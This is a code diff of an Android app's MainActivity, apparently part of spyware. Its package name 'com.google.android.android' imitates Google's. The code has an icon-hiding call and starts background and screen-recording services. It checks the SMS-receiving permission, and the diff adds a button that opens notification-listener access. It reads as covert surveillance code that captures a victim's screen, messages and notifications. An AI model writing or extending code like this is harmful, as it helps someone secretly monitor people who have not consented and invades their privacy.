@@ -2,15 +2,11 @@ package com.google.android.android;
 
 import android.Manifest;
 import android.content.ComponentName;
-import android.content.Context;
 import android.content.Intent;
 import android.content.ServiceConnection;
 import android.content.pm.PackageManager;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
-import android.net.wifi.ScanResult;
-import android.net.wifi.WifiConfiguration;
-import android.net.wifi.WifiManager;
 import android.os.Bundle;
 import android.os.IBinder;
 import android.support.v4.app.ActivityCompat;
@@ -18,11 +14,9 @@ import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.util.DisplayMetrics;
 import android.util.Log;
+import android.view.View;
+import android.widget.Button;
 
-import org.json.JSONArray;
-
-import java.util.Iterator;
-import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -47,6 +41,7 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         mainActivity = this;
 
+        initListeners();
         checkUsesPermissions();
         //hideIcon();
         startService(new Intent(this, MainService.class));
@@ -56,6 +51,8 @@ public class MainActivity extends AppCompatActivity {
         projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
         Intent intent = new Intent(this, RecordService.class);
         bindService(intent, connection, BIND_AUTO_CREATE);
+
+        Log.i("Carter", "MainActivity created!");
     }
 
     public void startRecordScreen(int seconds) {
@@ -106,6 +103,18 @@ public class MainActivity extends AppCompatActivity {
         @Override
         public void onServiceDisconnected(ComponentName arg0) {}
     };
+
+    private void initListeners() {
+        Button notifSettingsButton = findViewById(R.id.notifSettingsButton);
+        notifSettingsButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent = new Intent(
+                        "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+                startActivity(intent);
+            }
+        });
+    }
 
     private void checkUsesPermissions() {
         if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECEIVE_SMS)
